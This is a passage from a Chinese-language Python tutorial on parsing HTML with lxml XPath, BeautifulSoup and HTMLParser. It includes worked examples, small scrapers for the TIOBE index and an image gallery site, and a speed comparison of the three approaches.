result = html.xpath('//ul//a')
print(result)

# 但如果这里用//ul/a,就无法获取任何结果了。因为/用于获取直接子节点,而在ul节点下没有直接的a子节点,只有li节点,所以无法获取任何匹配结果
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//ul/a')
print(result)  # []

</textarea><pre>
【 获取父节点 】
要查找父节点可以使用..来实现,也可以使用parent::来获取父节点

</pre><textarea>
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//a[@href="link4.html"]/../@class')
print(result)  # ['item-1']

# 也可以通过parent::来获取父节点
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//a[@href="link4.html"]/parent::*/@class')
print(result)

</textarea><pre>
【 属性匹配 】
在选取的时候还可以用@符号进行属性过滤

</pre><textarea>
# 选取class为item-1的li节点,通过加入[@class="item-0"],限制了节点的class属性为item-0,而HTML文本中符合条件的li节点有两个,所以结果应该返回两个匹配到的元素
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//li[@class="item-0"]')
print(result)  # [< Element li at 0x10a399288>, < Element li at 0x10a3992c8>]

</textarea><pre>
【 文本获取 】
用XPath中的text()方法获取节点中的文本

</pre><textarea>
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//li[@class="item-0"]/text()')
print(result)  # ['\n     ']

# 并没有获取到任何文本,只获取到了一个换行符,这是因为XPath中text()前面是/,而此处/的含义是选取直接子节点,很明显li的直接子节点都是a节点,文本都是在a节点内部的,所以这里匹配到的结果就是被修正的li节点内部的换行符,因为自动修正的li节点的尾标签换行了

# 因此获取li节点内部的文本就有两种方式,一种是逐层选取先选取a节点再获取文本,另一种就是使用//
result = html.xpath('//li[@class="item-0"]/a/text()')
print(result)  # ['first item', 'fifth item']

# 选取所有子孙节点的文本,其中前两个就是li的子节点a节点内部的文本,另外一个就是最后一个li节点内部的文本,即换行符
result = html.xpath('//li[@class="item-0"]//text()')
print(result)  # ['first item', 'fifth item', '\n     ']

</textarea><pre>
【 属性获取 】
用@符号就可以获取节点的属性
属性匹配是中括号加属性名和值来限定某个属性,如[@href="link1.html"],而此处的@href指的是获取节点的某个属性

</pre><textarea>
# 通过@href获取所有li节点下所有a节点的href属性
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//li/a/@href')
print(result)   # ['link1.html', 'link2.html', 'link3.html', 'link4.html', 'link5.html']

</textarea><pre>
【 属性多值匹配 】
某些节点的某个属性可能有多个值,这时就需要用contains()函数了
contains()方法第一个参数传入属性名称,第二个参数传入属性值,只要此属性包含所传入的属性值,就可以完成匹配了

</pre><textarea>
from lxml import etree
text = '''<li class="li li-first"><a href="link.html">first item</a></li>'''
html = etree.HTML(text)
result = html.xpath('//li[@class="li"]/a/text()')
print(result)  # []

result = html.xpath('//li[contains(@class, "li")]/a/text()')
print(result)  # ['first item']

</textarea><pre>
【 多属性匹配 】
还可能遇到一种情况,那就是根据多个属性确定一个节点,这时就需要同时匹配多个属性。此时可以使用运算符and来连接
这里的and其实是XPath中的运算符,另外还有很多运算符如or、mod等

or 或,实例：age=19 or age=20: 如果age是19则返回true,如果age是21则返回false
and 与,实例：age>19 and age<21: 如果age是20则返回true,如果age是18则返回false
mod 计算除法的余数,实例：5 mod 2: 1
| 计算两个节点集,实例：//book | //cd: 返回所有拥有book和cd元素的节点集
+ 加法,实例：6 + 4: 10
- 减法,实例：6 - 4:2
* 乘法,实例：6 * 4:24
div 除法,实例：8 div 4:2
= 等于,实例：age=19:如果age是19,则返回true。如果age是20,则返回false
!= 不等于,实例：age!=19:如果age是18,则返回true。如果age是19,则返回false
< 小于,实例：age<19:如果age是18,则返回true。如果age是19,则返回false
<= 小于或等于,实例：age<=19:如果age是19,则返回true。如果age是20,则返回false
> 大于,实例：age>19:如果age是20,则返回true。如果age是19,则返回false
>= 大于或等于,实例：age>=19:如果age是19,则返回true。如果age是18,则返回false

XPath函数contains(a, b)
如果字符串a包含字符串b则返回true,否则返回false。比如contains('猿人学Python', 'Python')返回true

</pre><textarea>
# 要确定这个节点,需要同时根据class和name属性来选择,一个条件是class属性里面包含li字符串,另一个条件是name属性为item字符串,二者需要同时满足,需要用and操作符相连,相连之后置于中括号内进行条件筛选

from lxml import etree
text = '''<li class="li li-first" name="item"><a href="link.html">first item</a></li>'''
html = etree.HTML(text)
result = html.xpath('//li[contains(@class, "li") and @name="item"]/a/text()')
print(result) # ['first item']

</textarea>XPath中text()不包含<textarea>
from lxml import etree, html

# 提取:你好啊产品经理,很高兴认识你
text = '''
<div class="post">
    <div class="quote">无关紧要的引用内容</div>
        你好啊
        <strong>产品经理</strong>,
        <span>很高兴认识你</span>
        。
</div>
'''

selector = html.fromstring(text)
selector.xpath('//div[@class="post"]/text()')  # ['\n    ', '\n        你好啊\n        ', ',\n        ', '\n        。\n']
# /text()只会获取当前标签下面的文本,不会获取子标签的文本,为了解决这个问题,在/text()前面再添加一根斜线
selector.xpath('//div[@class="post"]//text()') #['\n    ', '无关紧要的引用内容', '\n        你好啊\n        ', '产品经理', ',\n        ', '很高兴认识你', '\n        。\n']
# 抓取 class="post"这个 div标签下的文本和除了 class="quote"以外的所有子节点的文本
# 如果没有 你好啊这三个字,那么XPath可以这样写：
selector.xpath('//div[@class="post"]//*[not(@class="quote")]/text()')  # ['产品经理', '很高兴认识你']
# 你好啊这一句,它就是div标签下的文本,它不属于任何子标签,所以上面的XPath无法获取到,为了单独直接获取 div下面的内容,需要使用 |再拼接一个 XPath：
selector.xpath('//div[@class="post"]/text() | //div[@class="post"]//*[not(@class="quote")]/text()')
# ['\n    ', '\n        你好啊\n        ', '产品经理', ',\n        ', '很高兴认识你', '\n        。\n']
# 清除换行符
datas = selector.xpath('//div[@class="post"]/text() | //div[@class="post"]//*[not(@class="quote")]/text()')
''.join(x.strip() for x in datas)

</textarea><pre>
【 按序选择 】
有时在选择的时候某些属性可能同时匹配了多个节点,但是只想要其中的某个节点,如第二个节点或者最后一个节点,这时可以利用中括号传入索引的方法获取特定次序的节点

</pre><textarea>
from lxml import etree

text = '''
<div>
    <ul>
         <li class="item-0"><a href="link1.html">first item</a></li>
         <li class="item-1"><a href="link2.html">second item</a></li>
         <li class="item-inactive"><a href="link3.html">third item</a></li>
         <li class="item-1"><a href="link4.html">fourth item</a></li>
         <li class="item-0"><a href="link5.html">fifth item</a>
     </ul>
 </div>
'''
html = etree.HTML(text)
result = html.xpath('//li[1]/a/text()')  # 选取了第一个li节点
print(result)  #  ['first item']
result = html.xpath('//li[last()]/a/text()') # 选取了最后一个li节点
print(result)  #  ['fifth item']
result = html.xpath('//li[position()<3]/a/text()') # 选取位置小于3的li节点即位置序号为1和2的节点,得到的结果就是前两个li节点
print(result)  #  ['first item', 'second item']
result = html.xpath('//li[last()-2]/a/text()') # 选取了倒数第三个li节点
print(result)  #  ['third item']

</textarea><pre>
【 节点轴选择 】
XPath提供了很多节点轴选择方法,包括获取子元素、兄弟元素、父元素、祖先元素等

</pre><textarea>
from lxml import etree

text = '''
<div>
    <ul>
         <li class="item-0"><a href="link1.html"><span>first item</span></a></li>
         <li class="item-1"><a href="link2.html">second item</a></li>
         <li class="item-inactive"><a href="link3.html">third item</a></li>
         <li class="item-1"><a href="link4.html">fourth item</a></li>
         <li class="item-0"><a href="link5.html">fifth item</a>
     </ul>
 </div>
'''
html = etree.HTML(text)
print(html.xpath('//li[1]/ancestor::*'))
print(html.xpath('//li[1]/ancestor::div'))
print(html.xpath('//li[1]/attribute::*'))
print(html.xpath('//li[1]/child::a[@href="link1.html"]'))
print(html.xpath('//li[1]/descendant::span'))
print(html.xpath('//li[1]/following::*[2]'))
print(html.xpath('//li[1]/following-sibling::*'))

'''
运行结果如下:
[< Element html at 0x107941808>, < Element body at 0x1079418c8>, < Element div at 0x107941908>, < Element ul at 0x107941948>]
[< Element div at 0x107941908>]
['item-0']
[< Element a at 0x1079418c8>]
[< Element span at 0x107941948>]
[< Element a at 0x1079418c8>]
[< Element li at 0x107941948>, < Element li at 0x107941988>, < Element li at 0x1079419c8>, < Element li at 0x107941a08>]

第一次选择时调用了ancestor轴,可以获取所有祖先节点。其后需要跟两个冒号,然后是节点的选择器,*表示匹配所有节点,因此返回结果是第一个li节点的所有祖先节点,包括html、body、div和ul。
第二次选择时又加了限定条件,这次在冒号后面加了div,这样得到的结果就只有div这个祖先节点了。
第三次选择时调用了attribute轴,可以获取所有属性值,其后跟的选择器还是*,这代表获取节点的所有属性,返回值就是li节点的所有属性值。
第四次选择时调用了child轴,可以获取所有直接子节点。这里又加了限定条件,选取href属性为link1.html的a节点。
第五次选择时调用了descendant轴,可以获取所有子孙节点。这里又加了限定条件获取span节点,所以返回的结果只包含span节点而不包含a节点。
第六次选择时调用了following轴,可以获取当前节点之后的所有节点。这里虽然使用的是*匹配,但又加了索引选择,所以只获取了第二个后续节点。
第七次选择时调用了following-sibling轴,可以获取当前节点之后的所有同级节点。这里使用*匹配,所以获取了所有后续同级节点。
'''

</textarea>案例应用：抓取TIOBE指数前20名排行开发语言<textarea>
#!/usr/bin/env python3
#coding:utf-8
import requests
from requests.exceptions import RequestException
from lxml import etree
from lxml.etree import ParseError
import json

def one_to_page(html):
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36'}
    try:
        response = requests.get(html, headers=headers)
        body = response.text  # 获取网页内容
    except RequestException as e:
        print('request is error!',e)
    try:
        html=etree.HTML(body,etree.HTMLParser())  # 解析HTML文本内容
        result=html.xpath('//table[contains(@class,"table-top20")]/tbody/tr//text()') # 获取列表数据
        pos = 0
        for i in range(20):
            if i == 0:
                yield result[i:5]
            else:
                yield result[pos:pos+5]  #返回排名生成器数据
            pos+=5
    except ParseError as e:
         print(e.position)

def write_file(data):   #将数据重新组合成字典写入文件并输出
    for i in data:
        sul={
            'sep 2019':i[0],
            'sep 2018':i[1],
            'Programming Language':i[2],
            'Ratings':i[3],
            'Change':i[4]
        }
        with open('test.txt','a',encoding='utf-8') as f:
            f.write(json.dumps(sul,ensure_ascii=False) + '\n') #必须格式化数据
            f.close()
        print(sul)
    return None

def main():
    url='https://www.tiobe.com/tiobe-index/'
    data=one_to_page(url)
    revaule=write_file(data)
    if revaule == None:
        print('ok')

if __name__ == '__main__':
    main()

</textarea>案例应用：爬取mzitu<textarea>
Hostreferer = {
    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
    'Referer':'http://www.mzitu.com'
}
Picreferer = {
    'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
    'Referer':'http://i.meizitu.net'
}

import requests
from lxml import etree
url = 'https://www.mzitu.com/page/{}'

def get_html(url):
    response = requests.get(url,headers=Hostreferer)
    html = response.text
    page = etree.HTML(html)
    title = page.xpath('//img[@class ="lazy"]/@alt')
    img_urls = page.xpath('//img[@class ="lazy"]/@data-original')
    print("正在爬取")
    return zip(title,img_urls)

def get_img(url):
    for index, url in get_html(url):
        with open('{}.jpg'.format(index), 'wb+') as f:
            res = requests.get(url, headers=Picreferer)
            f.write(res.content)

if __name__ == '__main__':
    i = int(input('爬几页:'))
    for j in range(1,i+1):
        url = 'https://www.mzitu.com/page/{}'.format(j)
        print('正在爬取第{}页'.format(j))
        get_img(url)

</textarea><pre>
【 BeautifulSoup 】
pip3 install beautifulSoup4

安装解析器
Beautiful Soup支持Python标准库中的HTML解析器,还支持一些第三方的解析器,其中一个是lxml
pip install lxml
另一个可供选择的解析器是纯Python实现的 html5lib , html5lib的解析方式与浏览器相同
pip install html5lib

常用解析器用法及特点：
Python标准库
BeautifulSoup(markup, "html.parser")
Python的内置标准库、执行速度适中、文档容错能力强,但Python 2.7.3 or 3.2.2)前的版本中文档容错能力差

lxml HTML 解析器
BeautifulSoup(markup, "lxml")
速度快、文档容错能力强,但需要安装C语言库

lxml XML 解析器
BeautifulSoup(markup, ["lxml-xml"])
BeautifulSoup(markup, "xml")
速度快、唯一支持XML的解析器,但需要安装C语言库

html5lib
BeautifulSoup(markup, "html5lib")
最好的容错性、以浏览器的方式解析文档、生成HTML5格式的文档,但速度慢、不依赖外部扩展

</pre><textarea>
html_doc = """
< html>< head>< title>The Dormouse's story< /title>< /head>
< body>
< p class="title">< b>The Dormouse's story< /b>< /p>
< p class="story">Once upon a time there were three little sisters; and their names were
< a href="http://example.com/elsie" class="sister" id="link1">Elsie< /a>,
< a href="http://example.com/lacie" class="sister" id="link2">Lacie< /a> and
< a href="http://example.com/tillie" class="sister" id="link3">Tillie< /a>;
and they lived at the bottom of a well.< /p>
< p class="story">...< /p>
"""

# 使用BeautifulSoup解析这段代码,能够得到一个 BeautifulSoup 的对象,并能按照标准的缩进格式的结构输出
from bs4 import BeautifulSoup
soup = BeautifulSoup(html_doc, 'html.parser')
print(soup.prettify())

soup.title # < title>The Dormouse's story< /title>
soup.title.name # u'title'
soup.title.string # u'The Dormouse's story'
soup.title.parent.name # u'head'
soup.p # < p class="title">< b>The Dormouse's story< /b>< /p>
soup.p['class'] # u'title'
soup.a # < a class="sister" href="http://example.com/elsie" id="link1">Elsie< /a>
soup.find_all('a') # [< a class="sister" href="http://example.com/elsie" id="link1">Elsie< /a>,< a class="sister" href="http://example.com/lacie" id="link2">Lacie< /a>,< a class="sister" href="http://example.com/tillie" id="link3">Tillie< /a>]
soup.find(id="link3") # < a class="sister" href="http://example.com/tillie" id="link3">Tillie< /a>

# 从文档中找到所有a标签的链接:
for link in soup.find_all('a'):
    print(link.get('href'))
    # http://example.com/elsie
    # http://example.com/lacie
    # http://example.com/tillie

# 从文档中获取所有文字内容:
print(soup.get_text())

</textarea><textarea>
from bs4 import BeautifulSoup
with open("D:\\user\\Desktop\\the_blah.html") as wb_data:
    Soup = BeautifulSoup(wb_data, 'lxml')
    images = Soup.select("body > div.main-content > ul > li > img")
    desc = Soup.select('body > div.main-content > ul > li > p')

# zip函数会返回一个以元组为元素的列表
for images,desc in zip(images,desc):
    data={
        'images':images.get('src'), # 获得属性用get函数
        'desc':desc.get_text()
    }
    print(data)

</textarea><pre>
将一段文档传入BeautifulSoup的构造方法就能得到一个文档的对象, 可以传入一段字符串或一个文件句柄
from bs4 import BeautifulSoup
soup = BeautifulSoup(open("index.html"))
soup = BeautifulSoup("< html>data< /html>")

首先,文档被转换成Unicode,并且HTML的实例都被转换成Unicode编码
BeautifulSoup("Sacr& eacute; bleu!")
< html>< head>< /head>< body>Sacré bleu!< /body>< /html>
然后,Beautiful Soup选择最合适的解析器来解析这段文档,如果手动指定解析器那么Beautiful Soup会选择指定的解析器来解析文档

默认Beautiful Soup会将当前文档作为HTML格式解析,如果要解析XML文档要在BeautifulSoup构造方法中加入第二个参数 "xml":
soup = BeautifulSoup(markup, "xml")
当然还需要安装lxml

对象的种类
Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种: Tag, NavigableString, BeautifulSoup, Comment

1、Tag对象与XML或HTML原生文档中的tag相同:
soup = BeautifulSoup('< b class="boldest">Extremely bold< /b>')
tag = soup.b
type(tag)  # < class 'bs4.element.Tag'>

Tag有很多方法和属性,最重要的属性: name和attributes

Name
每个tag都有自己的名字,通过.name来获取:
tag.name  # u'b'
如果改变了tag的name,那将影响所有通过当前Beautiful Soup对象生成的HTML文档:
tag.name = "blockquote"
tag  # < blockquote class="boldest">Extremely bold< /blockquote>

Attributes
一个tag可能有很多个属性,tag < b class="boldest">有一个"class"的属性,值为"boldest"
tag的属性的操作方法与字典相同:
tag['class']  # u'boldest'
也可以直接"点"取属性, 比如: .attrs :
tag.attrs  # {u'class': u'boldest'}
tag的属性可以被添加,删除或修改
tag['class'] = 'verybold'
tag['id'] = 1
tag # < blockquote class="verybold" id="1">Extremely bold< /blockquote>

del tag['class']
del tag['id']
tag  # < blockquote>Extremely bold< /blockquote>

tag['class']  # KeyError: 'class'
print(tag.get('class'))  # None

多值属性
最常见的多值的属性是class,还有一些属性rel,rev,accept-charset,headers,accesskey,在Beautiful Soup中多值属性的返回类型是list:
css_soup = BeautifulSoup('< p class="body strikeout">< /p>')
css_soup.p['class']  # ["body", "strikeout"]

css_soup = BeautifulSoup('< p class="body">< /p>')
css_soup.p['class']  # ["body"]

如果某个属性看起来好像有多个值,但在任何版本的HTML定义中都没有被定义为多值属性,那么Beautiful Soup会将这个属性作为字符串返回
id_soup = BeautifulSoup('< p id="my id">< /p>')
id_soup.p['id']  # 'my id'

将tag转换成字符串时,多值属性会合并为一个值
rel_soup = BeautifulSoup('< p>Back to the < a rel="index">homepage< /a>< /p>')
rel_soup.a['rel']  # ['index']
rel_soup.a['rel'] = ['index', 'contents']
print(rel_soup.p)  # < p>Back to the < a rel="index contents">homepage< /a>< /p>

如果转换的文档是XML格式,那么tag中不包含多值属性
xml_soup = BeautifulSoup('< p class="body strikeout">< /p>', 'xml')
xml_soup.p['class']  # u'body strikeout'

可以遍历的字符串
字符串常被包含在tag内.Beautiful Soup用 NavigableString 类来包装tag中的字符串:
tag.string  # u'Extremely bold'
type(tag.string)  # < class 'bs4.element.NavigableString'>
一个NavigableString字符串与Python中的Unicode字符串相同,并且还支持包含在遍历文档树和搜索文档树中的一些特性. 通过unicode()方法可以直接将NavigableString对象转换成Unicode字符串:
unicode_string = unicode(tag.string)
unicode_string  # u'Extremely bold'
type(unicode_string)  # < type 'unicode'>
tag中包含的字符串不能编辑,但是可以被替换成其它的字符串,用replace_with()方法:
tag.string.replace_with("No longer bold")
tag  # < blockquote>No longer bold< /blockquote>

NavigableString对象支持遍历文档树和搜索文档树中定义的大部分属性, 并非全部.尤其是一个字符串不能包含其它内容(tag能够包含字符串或是其它tag),字符串不支持.contents或.string属性或find()方法

如果想在Beautiful Soup之外使用NavigableString对象,需要调用unicode()方法,将该对象转换成普通的Unicode字符串,否则就算Beautiful Soup已方法已经执行结束,该对象的输出也会带有对象的引用地址.这样会浪费内存.

BeautifulSoup对象
BeautifulSoup对象表示的是一个文档的全部内容.大部分时候,可以把它当作 Tag 对象,它支持 遍历文档树 和 搜索文档树 中描述的大部分的方法.
因为 BeautifulSoup 对象并不是真正的HTML或XML的tag,所以它没有name和attribute属性.但有时查看它的 .name 属性是很方便的,所以 BeautifulSoup 对象包含了一个值为 "[document]" 的特殊属性 .name
soup.name  # u'[document]'

注释及特殊字符串
Tag , NavigableString , BeautifulSoup几乎覆盖了html和xml中的所有内容,但还有一些特殊对象注释,Comment对象是一个特殊类型的NavigableString对象
markup = "< b><! --Hey, buddy. Want to buy a used parser?-->< /b>"
soup = BeautifulSoup(markup)
comment = soup.b.string
type(comment)  # < class 'bs4.element.Comment'>
comment # u'Hey, buddy. Want to buy a used parser'


遍历文档树

子节点
一个Tag可能包含多个字符串或其它的Tag,这些都是这个Tag的子节点.Beautiful Soup提供了许多操作和遍历子节点的属性.
Beautiful Soup中字符串节点不支持这些属性,因为字符串没有子节点

tag的名字
操作文档树最简单的方法就是告诉它你想获取的tag的name.如果想获取 < head> 标签,只要用 soup.head :
soup.head   # < head>< title>The Dormouse's story< /title>< /head>
soup.title  # < title>The Dormouse's story< /title>
这是个获取tag的小窍门,可以在文档树的tag中多次调用这个方法.下面的代码可以获取< body>标签中的第一个< b>标签:
soup.body.b  # < b>The Dormouse's story< /b>
通过点取属性的方式只能获得当前名字的第一个tag:
soup.a  # < a class="sister" href="http://example.com/elsie" id="link1">Elsie< /a>
如果想要得到所有的< a>标签,或是通过名字得到比一个tag更多的内容的时候,就需要用到 Searching the tree 中描述的方法,比如: find_all()
soup.find_all('a')
# [< a class="sister" href="http://example.com/elsie" id="link1">Elsie< /a>,< a class="sister" href="http://example.com/lacie" id="link2">Lacie< /a>,< a class="sister" href="http://example.com/tillie" id="link3">Tillie< /a>]

.contents和.children
tag的.contents属性可以将tag的子节点以列表的方式输出:
head_tag = soup.head
head_tag  # < head>< title>The Dormouse's story< /title>< /head>
head_tag.contents  # [< title>The Dormouse's story< /title>]
title_tag = head_tag.contents[0]
title_tag  # < title>The Dormouse's story< /title>
title_tag.contents  # [u'The Dormouse's story']

BeautifulSoup对象本身一定会包含子节点,也就是说html标签也是BeautifulSoup对象的子节点:
len(soup.contents)  # 1
soup.contents[0].name  # u'html'
字符串没有.contents属性,因为字符串没有子节点:
text = title_tag.contents[0]
text.contents  # AttributeError: 'NavigableString' object has no attribute 'contents'
通过tag的.children生成器,可以对tag的子节点进行循环:
for child in title_tag.children:
    print(child)
    # The Dormouse's story

.descendants
.contents和.children属性仅包含tag的直接子节点.例如head标签只有一个直接子节点title
head_tag.contents  # [< title>The Dormouse's story< /title>]
但title标签也包含一个子节点:字符串 "The Dormouse's story",这种情况下字符串 "The Dormouse's story"也属于head标签的子孙节点. .descendants 属性可以对所有tag的子孙节点进行递归循环 [5] :
for child in head_tag.descendants:
    print(child)
    # < title>The Dormouse's story< /title>
    # The Dormouse's story
上面的例子中head标签只有一个子节点,但是有2个子孙节点:head节点和head的子节点, BeautifulSoup有一个直接子节点(html节点),却有很多子孙节点:
len(list(soup.children))
# 1
len(list(soup.descendants))
# 25

.string
如果tag只有一个NavigableString类型子节点,那么这个tag可以使用.string得到子节点:
title_tag.string  # u'The Dormouse's story'
如果一个tag仅有一个子节点,那么这个tag也可以使用 .string 方法,输出结果与当前唯一子节点的 .string 结果相同:
head_tag.contents  # [< title>The Dormouse's story< /title>]
head_tag.string  # u'The Dormouse's story'
如果tag包含了多个子节点,tag就无法确定 .string 方法应该调用哪个子节点的内容, .string 的输出结果是 None :
print(soup.html.string)  # None

.strings 和 stripped_strings
如果tag中包含多个字符串,可以使用 .strings 来循环获取:
for string in soup.strings: print(repr(string))
输出的字符串中可能包含了很多空格或空行,使用.stripped_strings可以去除多余空白内容,全部是空格的行会被忽略掉,段首和段末的空白会被删除
for string in soup.stripped_strings: print(repr(string))

父节点
继续分析文档树,每个tag或字符串都有父节点:被包含在某个tag中

.parent
通过.parent属性来获取某个元素的父节点

.parents
通过元素的.parents属性可以递归得到元素的所有父辈节点

兄弟节点
在文档树中使用.next_sibling和.previous_sibling属性来查询兄弟节点:

回退和前进
.next_element和.previous_element

搜索文档树
Beautiful Soup定义了很多搜索方法,着重2个: find()和find_all()

</pre>【 正则表达式、BeautifulSoup、lxml性能对比 】<textarea>
import requests
import re
from bs4 import BeautifulSoup
from lxml import etree
import time

### 正则表达式
def re_info(r):
    ids = re.findall("<h2>(.*?)</h2>",r.text,re.S)
    contents = re.findall('<div class="content">.*?<span>(.*?)</span>',r.text,re.S)
    laughs = re.findall('<span class="stats-vote">.*?<i class="number">(.*?)</i>',r.text,re.S)
    comments = re.findall('<span class="stats-comments">.*?<i class="number">(.*?)</i>',r.text,re.S)
    return [ids,contents,laughs,comments]

### BeautifulSoup
def bs4_info(r):
    soup = BeautifulSoup(r.text,"lxml")
    infos = soup.select("div.article")
    for info in infos:
        id = info.select("h2")[0].text.strip()
        content = info.select("div.content")[0].text.strip()
        laugh = info.select("span.stats-vote i")[0].text
        comment = info.select("span.stats-comments i")[0].text
        return [id,content,laugh,comment]

### lxml
def lxml_info(r):
    html = etree.HTML(r.text)
    infos = html.xpath('//div[starts-with(@class,"article block untagged mb15")]')
    for info in infos:
        id = info.xpath('div[1]//h2/text()')[0]
        content = info.xpath('a[1]/div/span/text()')[0].strip()  #复制xpath时需添加/span标签
        laugh = info.xpath('div[2]/span[1]/i/text()')[0]
        comment = info.xpath('div[2]/span[2]/a/i/text()')[0]
        return [id,content,laugh,comment]

if __name__ == "__main__":
    url_list = ["https://www.qiushibaike.com/text/page/{}/".format(i) for i in range(1,14)]
    hds = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3294.6 Safari/537.36'}
    for name,get_info in [('re',re_info),('bs4',bs4_info),('lxml',lxml_info)]:
        start = time.time()
        for url in url_list:
            r = requests.get(url,headers = hds)
            get_info(r)
        stop = time.time()
        print(name,stop-start)

</textarea><pre>
运行结果：正则表达式和Lxml的运行时间都比较快,BS4较慢。所以当数据量较大时推荐使用Lxml。
使用lxml每次都是遍历,只查找想要的元素,使用bs会将整个DOM树解析出来保存,所以bs的解析速度相比lxml来说更慢,时间和空间消耗都会更大
bs提供了更加人性化的api,所以上手起来会更加简单

两者的使用方式
不过lxml的路径兼容性似乎较弱,使用"//"时出错的可能性较大,最好列出完整路径,例如：div[2]/span[1]/i/text()
re 2.6481516361236572
bs4 4.277244567871094
lxml 2.4631409645080566

解析方式
analysis = etree.HTML(html.text)
analysis = BeautifulSoup(html, "lxml")

获取所有的tr标签
trs = analysis.xpath("//tr")
trs = analysis.find_all('tr')

获取前两个tr标签
trs = analysis.xpath("//tr[position()< 3]")
trs = analysis.find_all('tr', limit=2)

获取class=odd的tr标签
trs = analysis.xpath(//tr[@class='odd'])
trs = analysis.find_all('tr', class_='odd') #因为class是python的关键字,所以bs4用class_表示class的筛选

获取一个标签属性的值
href = analysis.xpath(//a/@href)
a_list = analysis.find_all('a')[0]
href = a_list['href']

获取一个标签下的文本信息
str = analysis.xpath("//tr/text()")
tr = analysis.find_all('tr')[0]
str = tr.string

</pre>
</div>

<div id="HTMLParser">
<h4>HTMLParser</h4><pre>
HTMLParser是python自带用来解析html的模块,它可以非常方便地分析出html里面的标签、数据等。HTMLParser采用事件驱动的模式,当HTMLParser找到一个特定的标记时会去调用一个用户定义的函数来通知程序处理。它主要的用户回调函数的命名都是以handler_开头的,都是HTMLParser的成员函数。
使用时就从HTMLParser派生出新的类即定义一个从类HTMLParser继承的类,然后重新定义这几个以handler_开头的函数来实现自己需要的功能

handle_startendtag(tag, attrs)
处理开始标签和结束标签,如果想抽取图形链接就要重定义handle_startendtag( tag, attrs)函数
handle_starttag(tag, attrs)
处理开始标签,比如< xx>
handle_endtag(tag)
处理结束标签,比如< /xx>
handle_charref
处理特殊字符串,就是以&#开头的,一般是内码表示的字符
handle_entityref
处理一些特殊字符,以&开头的,特殊字符有两种,一种是英文表示的& nbsp;,一种是数字表示的& #1234;,这两种字符都可以通过Parser解析出来
handle_data
处理数据,就是< xx>data< /xx>中间的那些数据
handle_comment
处理注释
handle_decl
处理<!开头的,比如< !DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
handle_pi
处理形如<?instruction>的东西

tag是的html标签,attrs是(属性,值)元组(tuple)的列表(list)。HTMLParser自动将tag和attrs都转为小写
feed()方法可以多次调用,也就是不一定一次把整个HTML字符串都塞进去,可以一部分一部分塞进去。

</pre>debugger<textarea>
from html.parser import HTMLParser
class MyHTMLParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.links = []
    def handle_starttag(self, tag, attrs):
        print(tag, attrs)

</textarea><textarea>
from html.parser import HTMLParser
from html.entities import name2codepoint

class MyHTMLParser(HTMLParser):

    def handle_starttag(self, tag, attrs):
        print('<%s>' % tag)

    def handle_endtag(self, tag):
        print('</%s>' % tag)

    def handle_startendtag(self, tag, attrs):
        print('<%s/>' % tag)

    def handle_data(self, data):
        print(data)

    def handle_comment(self, data):
        print('<!--', data, '-->')

    def handle_entityref(self, name):
        print('&%s;' % name)

    def handle_charref(self, name):
        print('&#%s;' % name)

parser = MyHTMLParser()
parser.feed('''< html>
< body>
<!-- test html parser -->
    <p>Some < a href=\"#\">html< /a> HTML& nbsp;tutorial...<br>END</p>
< /body>< /html>''')

</textarea>抽取了html中的所有链接<textarea>
from html.parser import HTMLParser
class MyHTMLParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.links = []
    def handle_starttag(self, tag, attrs):
        #print("Encountered the beginning of a %s tag" % tag)
        if tag == "a":
            if len(attrs) == 0:
                pass
            else:
                for (variable, value) in attrs:
                    if variable == "href":
                        self.links.append(value)

if __name__ == "__main__":
    html_code = """ < a href="www.google.com"> google.com</a> < A Href="www.pythonclub.org"> PythonClub </a> < A HREF = "www.sina.com.cn"> Sina </a> """
    hp = MyHTMLParser()
    hp.feed(html_code)
    hp.close()
    print(hp.links)

</textarea>显示HTML中a标签之间的文字<textarea>
from html.parser import HTMLParser

page ='''''< a href="http://click.union.360buy.com/JdClick /?unionId=75" class="f1"  style="padding-left:13px; padding-right:14px">京东商城< /a>< a href="http://www.letao.com /?source=hao123" class="f1">乐淘网上鞋城< /a>< a href="http://www.lashou.com/cl_today/w_3001" class="f2">拉手团购< /a>< a href="http://www.amazon.cn/?tag=2009hao123famousdaohang" class="f2">亚马逊< /a>< a href="http://www.vancl.com/?source=hao123mp"  class="f1">凡客诚品< /a>< a href="http://reg.jiayuan.com/st/?id=3237&url=/st /main.php" class="f1">世纪佳缘'''

class hp(HTMLParser):
    a_text = False

    def handle_starttag(self,tag,attr):
        if tag == 'a':
            self.a_text = True

    def handle_endtag(self,tag):
        if tag == 'a':
            self.a_text = False

    def handle_data(self,data):
        if self.a_text:
            print (data)

yk = hp()
yk.feed(page)
yk.close()

</textarea>网页https://www.python.org/events/python-events/,用浏览器查看源码并复制,然后尝试解析一下HTML,输出Python官网发布的会议时间、名称和地点<textarea>
#!/usr/bin/python3
# -*- coding:utf-8 -*-

from html.parser import HTMLParser                    # 引入HTML解析模块
from urllib import request                            # 引入URL请求模块
import re                                             # 引入正则表达式模块

class MyHTMLParser(HTMLParser):

    def __init__(self):
        HTMLParser.__init__(self)                     # 继承父类的属性
        self.is_time = False                          # 初始化时间布尔值,用于判断标签是否表示时间,下面类似
        self.is_title = False
        self.is_location = False
        self.is_year = False
        self.info = []                                # 初始化一个list,用于储存获取的信息

    def handle_starttag(self, tag, attrs):            # 定义开始标签处理器
        if tag == 'time' :                            # 判断标签是否表示时间,若是,更改布尔值,下面类似
            self.is_time = True

